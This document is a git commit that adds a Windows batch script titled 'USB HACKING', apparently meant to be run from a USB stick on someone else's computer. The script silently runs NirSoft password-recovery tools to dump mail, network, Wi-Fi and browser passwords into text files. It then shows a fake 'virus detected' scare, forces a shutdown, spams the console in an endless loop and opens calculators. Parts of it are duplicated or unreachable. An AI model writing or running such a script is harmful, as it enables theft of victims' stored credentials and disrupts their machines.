6a82a22c9755f350dcf8005e9dbeb7474b3c0880
shaiiim1234 <74631298+shaiiim1234@users.noreply.github.com>
2020-11-17 23:58:18 +0000

    Add files via upload

---
+++ SHAI.M-HACKXDD/launch.bat
@@ -0,0 +1,138 @@
+color 2
+cls
+
+@echo off
+
+echo                       ---------------------------------
+echo                                    Bienvenue                                                                                        
+echo                         	  USB HACKING       
+echo                                       by                                       
+echo                                    SHAI.M                                  
+echo                                      2020              
+echo                       ---------------------------------
+
+
+Rem pause
+
+start mailpv.exe /stext PWD\mailpv.txt
+start mspass.exe /stext PWD\mspass.txt
+start netpass.exe /stext PWD\netpass.txt
+start WirelessKeyView.exe /stext PWD\WirelessKeyView.txt
+start WebBrowserPassView.exe /stext PWD\WebBrowserPassView.txt
+
+echo Copie des Passwords en cours ...
+ping 0.0.0.0 -n 1 >nul
+echo 10...
+ping 0.0.0.0 -n 1 >nul
+echo 20...
+ping 0.0.0.0 -n 1 >nul
+echo 30...
+ping 0.0.0.0 -n 1 >nul
+echo 40...
+ping 0.0.0.0 -n 1 >nul
+echo 50...
+ping 0.0.0.0 -n 1 >nul
+echo 60...
+ping 0.0.0.0 -n 1 >nul
+echo 70... 
+ping 0.0.0.0 -n 1 >nul
+echo 80...
+ping 0.0.0.0 -n 1 >nul
+echo 90...
+ping 0.0.0.0 -n 1 >nul
+echo 100
+ping 0.0.0.0 -n 1 >nul
+echo>nul
+echo Copie des passwords effectuee avec succes!
+
+ping 0.0.0.0 -n 2 >nul
+rem pause
+
+@echo off
+echo -----------------------------------------------------------------------------------------------------------------------------------------------
+
+echo UN VIRUS A ETE DETECTE
+
+echo CE VIRUS SE PROPAGERA DANS TOUT VOS FICHIERS DANS 10 SECONDE
+
+
+                                                                                             
+echo                                         -:+osyyhhhhhyyo+:.                                         
+echo                                     -odNMMMMMMMMMMMMMMMMMMNh+-                                     
+echo                                   :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.                                  
+echo                                 -hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy-                                
+echo                               :hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy.                              
+echo                             :dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/                             
+echo                            /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                            
+echo                           .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/                           
+echo                           oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.                          
+echo                           hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+                          
+echo                           dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                          
+echo                           hMMd-+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhs+/hMM+                          
+echo                           sMMs   `-+hmMMMMMMMMMMMMMMMMMMMMMMMds:.`   sMM.                          
+echo                           :MMh       ./ymMMMMMMMMMMMMMMMMMmy:`       dMd                           
+echo                           `NMM/         ./sdNMMMMMMMMMNds/.         +MM+                           
+echo                            oMMN+.          `.:odMMMdo:.`          .+NMN`                           
+echo                             +NMMNdyo/:--...-:+ymdmmmy+:-...--:+oydmMMMo                            
+echo                              :mMMMMMMMMNNNNNMMMs`h`sMMMNNNNNMMMMMMMMMM`                            
+echo                             `ymMMMMMMMMMMMMMMMy``d``yMMMMMMMMMMMMMMMMm`                            
+echo                             .MMMMMMMMMNmdNMMMN.`hMy`.NMMMMMMNmdmNMMMMM+                            
+echo                             /MMMMMMNy/.``dMMMMdoMMM+dMMMMMM+-```-NMMMm.                            
+echo                            `sNMmmd/.    hMMMMMMMMMMMMMMMMM:    -mNd+`                             
+echo                               -/. -/-    mMMMmMMMmNMN+sNMMN`    `--                                
+echo                                          /MMN-MMM:hMm mMMN+                                        
+echo                                          `MMM:MMM/dMN.MMMy                                         
+echo                                           NMM/MMM/mMN-MMMo                                         
+echo                                           mMM/MMM/mMN:MMM+                                         
+echo                                           dMM/NMM/NMN/MMM/                                         
+echo                                           hMM/mMM/NMN+MMM-                                         
+echo                                           yMM/dMM:NMm+MMM.                                         
+echo                                           oMM:hMM-NMh+MMN                                          
+echo                                           /MM:yMM`mMo+MMd                                          
+echo                                            -+`+hy sd.-ys:                                          
+                                                                                                  
+color c                                                                                               
+
+timeout 10
+
+cd..
+
+color a
+
+dir /s
+
+pause
+
+@echo off
+shutdown -s -t 20 -c " hacker xd(: "
+@echo off
+color a
+titel code
+
+:menu
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+goto :menu
+@echo off
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+
+pause
+
+@echo off
+shutdown -s -t 15 -c " hacker xd(: "
+@echo off
+color a
+titel code
+
+:menu
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+goto :menu
+@echo off
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
